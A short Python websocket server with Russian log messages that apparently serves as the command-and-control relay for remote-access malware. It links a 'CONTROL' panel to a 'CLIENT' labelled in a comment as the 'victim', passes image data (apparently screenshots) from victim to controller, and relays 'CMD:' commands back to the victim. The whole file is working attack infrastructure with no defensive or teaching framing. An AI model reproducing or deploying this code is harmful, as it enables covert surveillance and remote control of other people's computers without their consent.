import asyncio
import websockets
import os

client_ws = None
control_ws = None

async def handler(websocket):
    global client_ws, control_ws
    print("Новое подключение")
    try:
        async for message in websocket:
            if message == "CONTROL":
                control_ws = websocket
                print("Панель управления подключена")
                if client_ws:
                    await control_ws.send("CLIENT_CONNECTED")
            elif message == "CLIENT":
                client_ws = websocket
                print("Клиент (жертва) подключен")
                if control_ws:
                    await control_ws.send("CLIENT_CONNECTED")
            elif message.startswith("IMG:"):
                if control_ws:
                    try: await control_ws.send(message)
                    except: control_ws = None
            elif message.startswith("CMD:"):
                if client_ws:
                    try: await client_ws.send(message)
                    except: client_ws = None
    except websockets.exceptions.ConnectionClosed:
        print("Соединение закрыто")
    finally:
        if websocket == client_ws:
            client_ws = None
            if control_ws:
                try: await control_ws.send("CLIENT_DISCONNECTED")
                except: pass
        elif websocket == control_ws:
            control_ws = None

async def main():
    port = int(os.environ.get("PORT", 8080))
    async with websockets.serve(handler, "0.0.0.0", port):
        print(f"Сервер запущен на порту {port}")
        await asyncio.Future()

if __name__ == "__main__":
    asyncio.run(main())
